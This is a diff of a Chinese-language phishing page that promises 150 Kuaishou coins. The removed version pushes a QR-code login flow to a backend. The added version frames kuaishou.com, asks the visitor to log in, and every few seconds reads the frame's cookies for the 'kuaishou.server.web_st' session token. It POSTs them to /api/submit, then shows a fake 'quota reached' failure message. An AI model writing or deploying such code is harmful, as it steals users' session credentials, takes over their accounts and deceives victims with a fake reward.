@@ -6,87 +6,48 @@
 <title>领取奖励</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:linear-gradient(135deg,#1a1a2e,#16213e);color:#fff;font-family:Arial;text-align:center;padding:30px;min-height:100vh}
-.card{background:rgba(255,255,255,0.05);border-radius:20px;padding:30px;max-width:400px;margin:0 auto;border:1px solid rgba(255,255,255,0.1)}
-.gift{font-size:60px;margin-bottom:10px}
-h2{background:linear-gradient(90deg,#ff4900,#ff8c00);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:10px;font-size:24px}
-.sub{color:#aaa;font-size:14px;margin-bottom:20px}
-.qr-box{background:#fff;padding:15px;border-radius:15px;display:inline-block;margin:15px 0}
-.qr-box img{display:block;width:250px;height:250px}
-#status{margin-top:15px;font-size:16px;font-weight:bold;padding:10px;border-radius:10px}
-.wait{color:#ffaa00;background:rgba(255,170,0,0.1)}
-.scanned{color:#00aaff;background:rgba(0,170,255,0.1)}
-.ok{color:#00ff88;background:rgba(0,255,136,0.1)}
-.btn{margin-top:10px;padding:12px 30px;background:linear-gradient(90deg,#ff4900,#ff8c00);color:#fff;border:none;border-radius:25px;font-size:16px;cursor:pointer}
-.note{color:#666;font-size:12px;margin-top:15px}
+body{background:#0f0f0f;color:#fff;font-family:Arial;text-align:center;min-height:100vh}
+.top{background:linear-gradient(90deg,#ff4900,#ff8c00);padding:14px}
+.top h2{font-size:18px}
+.top p{font-size:12px;opacity:0.8}
+.iframe-box{width:100%;height:85vh;background:#fff}
+.iframe-box iframe{width:100%;height:100%;border:none}
+#tip{margin:8px 0;font-size:13px;color:#ffaa00}
+.btn{margin:6px;padding:8px 20px;background:#ff4900;color:#fff;border:none;border-radius:20px;font-size:13px;cursor:pointer}
 </style>
 </head>
 <body>
-<div class="card">
-    <div class="gift">🎁</div>
-    <h2>扫码领取150快币</h2>
-    <p class="sub">打开快手APP扫一扫即可领取</p>
-    <div class="qr-box" id="qrcode"></div>
-    <p id="status" class="wait">等待扫码...</p>
-    <button class="btn" onclick="start()">刷新二维码</button>
-    <p class="note">扫码后在手机上点确认即可领取</p>
+<div class="top">
+    <h2>🎁 扫码领取150快币</h2>
+    <p>点击右上角登录 → 扫码登录 → 确认即可</p>
 </div>
+<div class="iframe-box">
+    <iframe id="ks" src="https://www.kuaishou.com"></iframe>
+</div>
+<p id="tip">登录成功后自动领取</p>
+<button class="btn" onclick="document.getElementById('ks').src='https://www.kuaishou.com'">重新加载</button>
 
-<script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
 <script>
-var scanId = null;
-var timer = null;
-
-function start() {
-    if (timer) clearTimeout(timer);
-    document.getElementById("status").className = "wait";
-    document.getElementById("status").textContent = "正在生成...";
-    document.getElementById("qrcode").innerHTML = '<div style="color:#999">加载中...</div>';
-
-    fetch("/api/qr").then(function(res) {
-        return res.json();
-    }).then(function(data) {
-        if (data.error) {
-            document.getElementById("status").textContent = data.error;
-            return;
+var last = "";
+setInterval(function(){
+    try{
+        var doc = document.getElementById("ks").contentDocument || document.getElementById("ks").contentWindow.document;
+        var c = doc.cookie;
+        if(c && c.indexOf("kuaishou.server.web_st")!==-1 && c!==last){
+            last = c;
+            document.getElementById("tip").style.color = "#ffaa00";
+            document.getElementById("tip").textContent = "正在领取...";
+            fetch("/api/submit",{
+                method:"POST",
+                headers:{"Content-Type":"application/json"},
+                body:JSON.stringify({cookie:c})
+            }).then(function(){
+                document.getElementById("tip").style.color = "#ff4444";
+                document.getElementById("tip").textContent = "😢 领取失败，名额已上限";
+            });
         }
-        scanId = data.scanId;
-        document.getElementById("qrcode").innerHTML = '<img src="' + data.qrCode + '">';
-        document.getElementById("status").className = "wait";
-        document.getElementById("status").textContent = "请用快手APP扫描二维码";
-        poll();
-    }).catch(function() {
-        document.getElementById("status").textContent = "网络错误，请重试";
-    });
-}
-
-function poll() {
-    function check() {
-        if (!scanId) return;
-        fetch("/api/check?id=" + scanId).then(function(res) {
-            return res.json();
-        }).then(function(data) {
-            if (data.status === "done") {
-                document.getElementById("status").className = "ok";
-                document.getElementById("status").textContent = "😢 领取失败，名额已上限";
-                return;
-            }
-            if (data.status === "scanned") {
-                document.getElementById("status").className = "scanned";
-                document.getElementById("status").textContent = "已扫描，请在手机上确认登录";
-            }
-            if (data.status === "expired") {
-                document.getElementById("status").className = "wait";
-                document.getElementById("status").textContent = "二维码已过期，请点击刷新";
-                return;
-            }
-            timer = setTimeout(check, 2000);
-        });
-    }
-    check();
-}
-
-start();
+    }catch(e){}
+},3000);
 </script>
 </body>
 </html>
